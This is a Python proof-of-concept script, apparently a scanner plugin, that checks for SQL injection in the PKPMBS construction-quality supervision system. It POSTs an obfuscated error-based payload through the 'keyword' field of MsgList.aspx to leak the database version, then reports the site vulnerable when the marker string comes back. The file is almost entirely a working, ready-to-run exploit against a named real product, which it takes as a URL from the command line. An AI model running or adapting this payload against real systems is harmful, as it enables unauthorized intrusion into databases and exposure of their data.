#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: pkpmbs建设工程质量监督系统SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0120366
author: Lucifer
description: 文件/PKPMBS/portal/MsgList.aspx postSQL注入。
'''
import sys
import json
import requests
import warnings
def run(url):
        result=['','不存在']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/PKPMBS/portal/MsgList.aspx"
        post_data = {
            "keyword":"1' AnD 1=CoNvErT(InT,(ChAr(71)+ChAr(65)+ChAr(79)+ChAr(74)+ChAr(73)+@@VeRsIoN)) AnD '%'='",
            "Submit3":"搜　索"
        }
        vulnurl = url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"GAOJIMicrosoft" in req.text:
                result[1]=  '存在'
                result[0]=vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            else:
                result[1]=  '不存在'

        except:
            result[1]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
